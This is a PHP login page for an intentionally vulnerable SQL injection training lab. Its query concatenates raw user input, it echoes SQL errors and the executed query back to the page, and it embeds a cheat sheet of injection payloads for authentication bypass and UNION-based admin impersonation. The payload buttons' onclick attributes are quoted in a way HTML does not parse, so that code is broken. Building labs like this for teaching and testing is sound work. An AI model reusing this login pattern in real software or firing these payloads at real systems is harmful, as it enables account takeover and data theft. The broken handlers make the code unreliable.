<?php
session_start();
require_once 'db.php';

// Redirect to dashboard if already logged in
if (isset($_SESSION['user_id'])) {
    header("Location: index.php");
    exit();
}

$error = '';
$executed_sql = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // Intentionally VULNERABLE SQL Query for educational lab purposes
    $executed_sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

    // Execute query directly without parameterization
    $result = @mysqli_query($conn, $executed_sql);

    if (!$result) {
        $error = "SQL Syntax Error: " . mysqli_error($conn);
    } else {
        if (mysqli_num_rows($result) > 0) {
            $user = mysqli_fetch_assoc($result);

            // Establish user session
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['username'] = $user['username'];
            $_SESSION['role'] = $user['role'];
            $_SESSION['email'] = $user['email'];

            header("Location: index.php");
            exit();
        } else {
            $error = "Invalid credentials! User not found or password incorrect.";
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - SQL Injection Lab</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>🔐 SQLi Auth Lab</h1>
            <p>Authentication & Session Setup (Intentionally Vulnerable)</p>
        </header>

        <div class="card">
            <h2>Account Login</h2>

            <?php if (isset($_GET['msg']) && $_GET['msg'] === 'logged_out'): ?>
                <div class="alert alert-info">You have been logged out successfully.</div>
            <?php endif; ?>

            <?php if ($error): ?>
                <div class="alert alert-danger"><?= $error ?></div>
            <?php endif; ?>

            <form action="login.php" method="POST">
                <div class="form-group">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" class="form-control" placeholder="e.g. admin or admin' -- " required>
                </div>

                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" class="form-control" placeholder="Enter password (or leave blank if bypassing)">
                </div>

                <button type="submit" class="btn" style="width: 100%;">Sign In</button>
            </form>

            <?php if (!empty($executed_sql)): ?>
                <div class="query-debug">
                    <h4>Executed SQL Query:</h4>
                    <code><?= htmlspecialchars($executed_sql) ?></code>
                </div>
            <?php endif; ?>

            <div class="cheat-sheet">
                <h4>🎯 Quick Attack Payloads (Click to Test)</h4>
                <p style="font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 8px;">
                    Click a payload below to auto-fill the username input:
                </p>
                <span class="payload-tag" onclick="fillPayload(\"admin' -- \", '')">admin' -- </span>
                <span class="payload-tag" onclick="fillPayload(\"' OR '1'='1\", \"' OR '1'='1\")">' OR '1'='1</span>
                <span class="payload-tag" onclick="fillPayload(\"admin' #\", '')">admin' #</span>
                <span class="payload-tag" onclick="fillPayload(\"' UNION SELECT 1, 'hacked', 'pass', 'e@e.com', 'admin' -- \", '')">UNION Admin Impersonation</span>
            </div>

            <div class="nav-links">
                Don't have an account? <a href="register.php">Register Here</a>
            </div>
        </div>
    </div>

    <script>
        function fillPayload(user, pass) {
            document.getElementById('username').value = user;
            document.getElementById('password').value = pass;
        }
    </script>
</body>
</html>
